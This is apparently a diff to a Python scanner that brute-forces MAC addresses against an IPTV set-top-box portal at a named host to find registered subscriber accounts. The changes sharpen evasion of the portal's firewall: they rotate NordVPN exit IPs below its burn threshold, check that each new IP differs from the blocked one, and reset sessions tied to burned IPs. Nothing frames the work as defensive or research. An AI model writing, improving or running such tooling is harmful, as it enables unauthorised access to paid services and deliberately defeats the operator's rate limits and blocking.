@@ -65,8 +65,11 @@ MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
 DEFAULT_BASE = "http://line.tvdsz.cc"
 DEFAULT_COUNT = 100
 DEFAULT_WORKERS = 10
-DEFAULT_REQ_PER_IP = 12
-DEFAULT_DELAY = 0.2
+# The portal's WAF hard-burns a source IP after roughly 7 rapid requests
+# (connection dropped, HTTP 000). Rotate just below that ceiling so we switch
+# to a fresh IP *before* a request times out and wastes the full timeout.
+DEFAULT_REQ_PER_IP = 6
+DEFAULT_DELAY = 0.1
 DEFAULT_TIMEOUT = 3.0
 
 # Fallback country list if `nordvpn countries` is unavailable.
@@ -199,25 +202,32 @@ def nordvpn_countries():
     return lines if lines else list(FALLBACK_COUNTRIES)
 
 
-def rotate_nordvpn(country):
+def rotate_nordvpn(country, avoid_ip=None, timeout=30):
     """Disconnect and reconnect to a fresh server in `country`.
 
     Returns the new source IP, or None if it could not be determined.
+
+    Crucially, an IP is only accepted once NordVPN is *actually* connected AND
+    it differs from `avoid_ip`. Otherwise, while the tunnel is still coming
+    up, ``current_ip()`` returns the host's direct (non-VPN) IP and the caller
+    would treat that burned direct IP as a fresh rotation.
     """
     log.info("rotating NordVPN -> %s", country or "any")
     run_nordvpn(["disconnect"])
-    time.sleep(2)
+    time.sleep(1.5)
     if country:
         run_nordvpn(["connect", country])
     else:
         run_nordvpn(["connect"])
-    # wait for a stable, reachable IP
-    for _ in range(6):
-        time.sleep(2)
-        ip = current_ip()
-        if ip:
-            log.info("new source IP: %s", ip)
-            return ip
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        if nordvpn_connected():
+            ip = current_ip()
+            if ip and ip != avoid_ip:
+                log.info("new source IP: %s", ip)
+                return ip
+        time.sleep(0.5)
+    # Best effort: report whatever we can see, even if unchanged.
     return current_ip()
 
 
@@ -247,6 +257,15 @@ class Rotator:
         self.rotations = 0
         self.current = None
         self._dirty = False  # True -> a rotation is needed before the next request
+        # Bumped on every successful rotation. Portal sessions remember the
+        # generation they were created with; a mismatch means their sockets are
+        # still bound to the OLD source IP and must be recreated, otherwise the
+        # keep-alive connections keep routing out through the burned IP and the
+        # rotation has no effect.
+        self._generation = 0
+
+    def generation(self):
+        return self._generation
 
     # -- connection --------------------------------------------------------
     def ensure_connected(self):
@@ -274,13 +293,23 @@ class Rotator:
         blocking call — so the other workers keep making progress.
         """
         with self._rotate_lock:
+            prev_ip = self.current
             country = self._next_country()
-            new_ip = rotate_nordvpn(country)
+            new_ip = rotate_nordvpn(country, avoid_ip=prev_ip)
+            # If we landed on the same IP anyway (server reuse, or the tunnel
+            # didn't change route), try one more country before accepting it.
+            if new_ip and new_ip == prev_ip:
+                country2 = self._next_country()
+                log.info("same IP as before (%s); trying %s", new_ip, country2)
+                new_ip = rotate_nordvpn(country2, avoid_ip=prev_ip)
             with self._lock:
                 self.current = new_ip or "<unknown>"
                 self._used_this_ip = 0
                 self._dirty = False
                 self.rotations += 1
+                # Invalidate every Portal session: their keep-alive sockets are
+                # still bound to the previous source IP.
+                self._generation += 1
         return self.current
 
     def rotate(self):
@@ -292,7 +321,12 @@ class Rotator:
     def begin_request(self):
         """Called before a request. Proactively rotates (blocking) once the
         per-IP request budget is exhausted, or when a rotation is already
-        pending from a previous block. Returns True if a rotation was done."""
+        pending from a previous block.
+
+        Several workers can hit the budget in the same burst; only the one that
+        flips ``_dirty`` actually rotates, the rest proceed so we don't chain
+        back-to-back (wasteful) rotations.
+        """
         with self._lock:
             if self.requests_per_ip is not None:
                 self._used_this_ip += 1
@@ -301,17 +335,30 @@ class Rotator:
                 threshold_hit = False
             needed = self._dirty or threshold_hit
             if not needed:
-                return False
-            if threshold_hit:
-                log.info("reached %d requests on this IP -> proactive rotation",
-                         self.requests_per_ip)
+                return
+            claimed = not self._dirty
+            if claimed:
+                self._dirty = True
+                if threshold_hit:
+                    log.info("reached %d requests on this IP -> proactive rotation",
+                             self.requests_per_ip)
         # Rotation happens outside the fast lock so workers don't stall.
-        self._rotate()
-        return True
+        if claimed:
+            self._rotate()
+        return claimed
 
-    def report_blocked(self):
-        """A block was observed: rotate now. Only the first reporter in a
-        burst actually rotates; the rest are no-ops."""
+    def report_blocked(self, gen_at_start=None):
+        """A block was observed: rotate now.
+
+        When an IP burns, every worker with an in-flight request on it blocks at
+        once. We only want ONE rotation per burned IP: if a rotation already
+        happened since this caller started its request (generation changed), the
+        fresh IP is already in flight, so this call is a no-op. `gen_at_start`
+        is the generation captured by the caller before it issued the request.
+        """
+        if gen_at_start is not None and self.generation() != gen_at_start:
+            # Someone already rotated; the new IP is fresh. Don't chain.
+            return
         with self._lock:
             needed = not self._dirty
             if needed:
@@ -336,11 +383,21 @@ class Portal:
         self._local = threading.local()
 
     def _session(self):
+        # A session is only valid for the generation of source IP it was
+        # created with. After a rotation the old keep-alive sockets still carry
+        # the burned IP, so we must drop them and open a fresh connection.
+        gen = self.rotator.generation() if self.rotator else 0
         s = getattr(self._local, "session", None)
-        if s is None:
+        if s is None or getattr(self._local, "session_gen", -1) != gen:
+            if s is not None:
+                try:
+                    s.close()
+                except Exception:  # noqa: BLE001
+                    pass
             s = requests.Session()
             s.headers.update({"User-Agent": STB_UA})
             self._local.session = s
+            self._local.session_gen = gen
         return s
 
     def _get(self, params, cookie_mac=None):
@@ -594,12 +651,16 @@ class Scanner:
 
     def handle_mac(self, mac):
         """Probe one MAC; returns 'REGISTERED', 'EMPTY', or 'BLOCKED'."""
+        # Capture the source-IP generation before we issue anything so we can
+        # tell whether a rotation already happened while our request was in
+        # flight (a burned IP blocks every worker on it at once).
+        gen_at_start = self.rotator.generation() if self.rotator else 0
         res = self.portal.oracle(mac, oracle_kind=self.args.oracle)
         verdict = res["verdict"]
 
         if verdict == "BLOCKED":
             # Rotate and retry the same MAC, bounded.
-            self.rotator.report_blocked()
+            self.rotator.report_blocked(gen_at_start)
             for attempt in range(self.args.max_retry):
                 time.sleep(0.2 * (attempt + 1))
                 res = self.portal.oracle(mac, oracle_kind=self.args.oracle)
@@ -734,7 +795,8 @@ def parse_args(argv):
                     help="NordVPN country for rotation (default: round-robin)")
     ap.add_argument("--requests-per-ip", type=int, default=DEFAULT_REQ_PER_IP,
                     help="rotate to a fresh IP after N requests per IP "
-                         "(default %(default)s; the WAF hard-blocks ~15-20)")
+                         "(default %(default)s; the WAF hard-burns an IP after "
+                         "~7 rapid requests, so stay below it)")
     ap.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                     help="sleep between MACs (default %(default)s s)")
     ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
